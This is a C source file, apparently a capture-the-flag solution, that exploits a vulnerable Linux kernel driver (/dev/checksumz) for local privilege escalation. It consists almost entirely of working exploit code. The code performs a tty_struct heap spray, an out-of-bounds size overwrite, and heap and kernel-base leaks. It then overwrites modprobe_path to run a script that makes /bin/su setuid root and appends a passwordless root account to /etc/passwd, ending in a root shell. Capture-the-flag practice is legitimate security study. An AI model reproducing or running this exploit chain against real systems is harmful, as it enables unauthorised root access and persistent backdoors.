#include <kpwn.h>
#include <api.h>

#define SPRAY_NUM 800
#define modprobe KADDR(0xffffffff82b3f100)

static inline void p64(uint8_t out[8], uint64_t v)
{
    out[0] = (uint8_t)(v & 0xff);
    out[1] = (uint8_t)((v >> 8) & 0xff);
    out[2] = (uint8_t)((v >> 16) & 0xff);
    out[3] = (uint8_t)((v >> 24) & 0xff);
    out[4] = (uint8_t)((v >> 32) & 0xff);
    out[5] = (uint8_t)((v >> 40) & 0xff);
    out[6] = (uint8_t)((v >> 48) & 0xff);
    out[7] = (uint8_t)((v >> 56) & 0xff);
}

ssize_t write_u64_le(int fd, uint64_t v)
{
    uint8_t buf[8];
    p64(buf, v);

    ssize_t total = 0;
    while (total < 8)
    {
        ssize_t w = write(fd, buf + total, 8 - total);
        if (w < 0)
        {
            if (errno == EINTR)
                continue;
            return -1;
        }
        total += w;
    }
    return total;
}

int main() {

    uint64_t kbase;
    uint64_t heap;

    uint64_t *buf = calloc(0x600, sizeof(uint64_t));

    int spray_fds[SPRAY_NUM];

    for (int i = 0; i < SPRAY_NUM / 2; i++) {
        spray_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (spray_fds[i] == -1) errExit("open /dev/ptmx");
    }

    int fd = open("/dev/checksumz", O_RDWR);
    if (fd == -1) errExit("open /dev/checksumz");

    for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
        spray_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (spray_fds[i] == -1) errExit("open /dev/ptmx");
    }

    logInfo("Seek to the end of the buffer");
    lseek64(fd, 510, SEEK_SET);

    logInfo("Overwrite the size field");
    write(fd, "\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff", 10);

    logInfo("Now for the leak...");
    logInfo("Seek to buffer->name for heap leak");
    lseek64(fd, (0x218 - 0x10), SEEK_SET);

    read(fd, buf, 0x20);
    heap = buf[1];
    logOK("Heap leak: 0x%lx", heap);

    logInfo("Seek to tty_struct to leak kernel base");
    lseek64(fd, 0x400, SEEK_SET);
    read(fd, buf, 256);

    kbase = buf[3] - 0x1289480;

    if (kbase & 0xfff)
    {
        logErr("Kernel base seems wrong..., got 0x%lx", kbase);
        logErr("Invalid kernel base, trying to fix by adding 0x120");
        kbase += 0x120;
    }

    logOK("Kernel leak: 0x%lx", kbase);

    logInfo("Now overwrite buffer->name for arbitrary write");
    lseek64(fd, 0x210, SEEK_SET);
    write_u64_le(fd, modprobe);

    logInfo("Overwrite modprobe_path");
    ioctl(fd, CHECKSUMZ_IOCTL_RENAME, "/tmp/x\0");

    logInfo("Prepare /tmp/x script and trigger modprobe");
    system("echo -e \"#!/bin/sh\nchown root:root /bin/su\nchmod u+s /bin/su\necho 'kasero::0:0:root:/:/bin/sh' >> /etc/passwd\n\" > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");

    logInfo("Tada!");
    system("su kasero; /bin/sh");

    // irisctf{was_it_really_worth_the_speedup}

    return 0;
}
